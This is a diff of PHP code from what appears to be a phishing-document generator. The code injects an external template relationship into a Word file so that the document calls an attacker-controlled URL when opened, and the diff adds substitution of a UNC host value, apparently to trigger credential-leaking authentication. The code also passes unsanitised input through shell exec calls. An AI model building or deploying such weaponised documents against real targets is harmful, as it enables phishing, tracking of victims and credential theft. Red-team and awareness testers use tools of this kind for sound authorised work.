@@ -375,7 +375,7 @@ $posrels = strpos($settingsxmlrels, "</Relationships>");
 $beforerels = substr($settingsxmlrels, 0, $posrels);
 
 $settingsrelspayload = "<Relationship Id=\"rId9999\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"
-                        Target=\"".$URL."/phishingdocs/".$basicauthurl."\"
+                        Target=\"URLVALUE/phishingdocs/REPLACEME\"
                         TargetMode=\"External\"/>";
 
 $settingsrelsfile = "/var/www/uploads/word/_rels/settings.xml.rels";
@@ -396,6 +396,12 @@ $basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)
 $cmd15 = "sed -i -e 's~REPLACEME~".$basicauthurl."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
 exec($cmd15,$output15);
 //var_dump($output15);
+
+$domainonly = parse_url($URL, PHP_URL_HOST);
+
+$cmdunc2 = "sed -i -e 's~UNCVALUE~".stripslashes($domainonly)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
+exec($cmdunc2,$outputunc2);
+//var_dump($output18);
 
 $cmd18 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
 exec($cmd18,$output18);
@@ -460,6 +466,12 @@ $basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)
 $cmd15 = "sed -i -e 's~REPLACEME~".$basicauthurl."~g' word/_rels/settings.xml.rels;";
 exec($cmd15,$output15);
 //var_dump($output15);
+
+$domainonly = parse_url($URL, PHP_URL_HOST);
+
+$cmdunc3 = "sed -i -e 's~UNCVALUE~".stripslashes($domainonly)."~g' word/_rels/settings.xml.rels;";
+exec($cmdunc3,$outputunc3);
+//var_dump($output18);
 
 $cmd18 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/settings.xml.rels;";
 exec($cmd18,$output18);
